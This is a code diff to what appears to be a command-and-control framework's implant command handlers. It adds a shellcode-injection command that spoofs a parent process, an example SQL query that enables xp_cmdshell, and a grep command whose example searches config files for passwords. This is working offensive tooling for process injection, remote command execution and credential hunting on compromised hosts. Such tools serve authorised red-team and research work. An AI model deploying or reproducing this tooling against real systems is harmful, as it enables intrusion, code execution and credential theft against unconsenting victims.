@@ -147,6 +147,65 @@ def do_upload_file(user, command, implant_id, command_prefix=""):
         traceback.print_exc()
 
 
+
+
+@command(commands, commands_help, examples, block_help, tags=[Tag.Injection])
+def do_inject_shellcode_kct(user, command, implant_id, command_prefix=""):
+    """
+    Inject shellcode into a target process, obtaining an implant in that process using KCT injection.
+
+    Prompts for the shellcode file to use.
+
+    Can either:
+     * Provide an executable to start and inject into (default is c:\\windows\\system32\\msinfo32.exe),
+        * With an optional parent PID to spoof if starting an executable,
+     * Or the PID of an already running process to inject into
+
+    In either case, the ability to set the allocated memory permissions to PAGE_EXECUTE_READWRITE can be done with the rwx
+    argument, if the shellcode requires it (PAGE_READWRITE for writing then PAGE_EXECUTE_READ for running is used by default).
+
+    MITRE TTPs:
+        {}
+        
+    Examples:
+        inject-shellcode-kct [path-to-executable-to-start] [windows name]
+        inject-shellcode-kct c:\\windows\\system32\\msinfo32.exe "System Information"
+        inject-shellcode-kct c:\\windows\\notepad.exe Notepad
+
+    """
+    if command == "inject-shellcode-kct":
+        print_bad("\nMissing arguments!")
+        return
+
+    params = re.compile("inject-shellcode-kct", re.IGNORECASE)
+    params = params.sub("", command)
+    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.shellcode-history'),
+                            auto_suggest=AutoSuggestFromHistory(), style=style)
+
+    try:
+        path = session.prompt("Location of shellcode file: ",
+                              completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
+        path = PayloadsDirectory + path
+    except KeyboardInterrupt:
+        return
+
+    try:
+        shellcode_file = load_file(path)
+
+        if shellcode_file is not None:
+            command = f"inject-shellcode-kct {base64.b64encode(shellcode_file).decode('utf-8')}{params} #{os.path.basename(path)}"
+            new_task = NewTask(
+                implant_id=implant_id,
+                command=f"{command_prefix} {command}" if command_prefix else command,
+                user=user,
+                child_implant_id=None
+            )
+
+            insert_object(new_task)
+    except Exception as e:
+        print(f"Error loading file: {e}")
+
+
 @command(commands, commands_help, examples, block_help, tags=[Tag.Injection])
 def do_inject_shellcode_syscall(user, command, implant_id, command_prefix=""):
     """
@@ -689,6 +748,7 @@ def do_sqlquery(user, command, implant_id, command_prefix=""):
         sqlquery server=localhost port=5555 username=sa password=sa database=Master
         sqlquery server=localhost port=5555 username=sa password=sa catalogue=Master
         sqlquery server=localhost port=5555 username=sa password=sa query="SELECT suser_name();"
+        sqlquery server=localhost port=5555 username=sa password=sa query="EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
 
     """
     check_module_loaded("SQLQuery.exe", implant_id, user, load_module_command=command_prefix)
@@ -3061,6 +3121,32 @@ def do_user_logons(user, command, implant_id, command_prefix=""):
 
 @command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
 def do_grep(user, command, implant_id, command_prefix=""):
+    """
+    Greps in files on the local system.
+
+    MITRE TTPs:
+        {}
+
+    Arguments:
+        grep <path> <file mask> <grep> <recurse>
+
+    Examples:
+        grep C:\\temp *.config password= true
+    """
+    check_module_loaded("FileGrep.exe", implant_id, user, load_module_command=command_prefix)
+    command = command.replace("filegrep", "run-exe FileGrep.Program FileGrep")
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=f"{command_prefix} {command}" if command_prefix else command,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
+
+
+@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
+def do_filegrep(user, command, implant_id, command_prefix=""):
     """
     Greps in files on the local system.
 
